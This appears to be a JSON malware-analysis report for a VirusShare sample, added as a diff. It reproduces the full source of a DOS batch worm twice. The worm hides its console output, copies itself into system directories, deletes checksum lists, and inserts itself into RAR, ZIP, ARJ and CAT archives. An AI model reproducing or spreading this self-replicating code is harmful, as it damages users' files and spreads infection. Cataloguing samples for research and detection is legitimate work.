@@ -1,0 +1,70 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nif \"%1==\"#r goto rar\nif \"%1==\"#z goto zip\nif \"%1==\"#a goto arj\nif \"%1==\"#c goto cat\nctty nul\ncopy %0 c:\\dos\\%0\ncopy %0 c:\\windows\\%0\ncopy %0 c:\\win98\\%0\ncopy %0 C:\\win95\\%0\ncopy %0 c:\\%0\ncopy %0 ..\\%0\ndel chklist.*\nctty con\nfor %%r in (*.rar) do call %0 #r %%r\nfor %%z in (*.zip) do call %0 #z %%z\nfor %%a in (*.arj) do call %0 #a %%a\nfor %%c in (*.cat) do call %0 #c %%c\ngoto end\n:rar\nattrib -r %2\nrar a -tk -y -c- -o+ %2 %0 >nul\ngoto end\n:zip\nattrib -r %2\npkzip %2 %0 >nul\ngoto end\n:arj\nattrib -r %2\narj a %2 %0 >nul\n:cat\nattrib -r %2\ncat -la -1 -Pk -C LUCKY >nul\n:end\nrem from LUCKY B.R.D 1994-99    Yes,,,,so what so think\necho on"
+    },
+    "filename": "VirusShare_0cd196f047dc94ab73946c68f80976b4",
+    "filesize": 681,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0cd196f047dc94ab73946c68f80976b4",
+        "sha1": "27306e0aa77572ce49af34439b70f9ac5a46e26d",
+        "sha256": "060bfee1d43198996caa96f15f40b8b7dbfb63a7f24562ba30da2d5556dc2155"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if \"%1==\"#r goto rar",
+            "if \"%1==\"#z goto zip",
+            "if \"%1==\"#a goto arj",
+            "if \"%1==\"#c goto cat",
+            "ctty nul",
+            "copy %0 c:\\dos\\%0",
+            "copy %0 c:\\windows\\%0",
+            "copy %0 c:\\win98\\%0",
+            "copy %0 C:\\win95\\%0",
+            "copy %0 c:\\%0",
+            "copy %0 ..\\%0",
+            "del chklist.*",
+            "ctty con",
+            "for %%r in (*.rar) do call %0 #r %%r",
+            "for %%z in (*.zip) do call %0 #z %%z",
+            "for %%a in (*.arj) do call %0 #a %%a",
+            "for %%c in (*.cat) do call %0 #c %%c",
+            "goto end",
+            ":rar",
+            "attrib -r %2",
+            "rar a -tk -y -c- -o+ %2 %0 >nul",
+            "goto end",
+            ":zip",
+            "attrib -r %2",
+            "pkzip %2 %0 >nul",
+            "goto end",
+            ":arj",
+            "attrib -r %2",
+            "arj a %2 %0 >nul",
+            ":cat",
+            "attrib -r %2",
+            "cat -la -1 -Pk -C LUCKY >nul",
+            ":end",
+            "rem from LUCKY B.R.D 1994-99    Yes,,,,so what so think",
+            "echo on"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275141",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
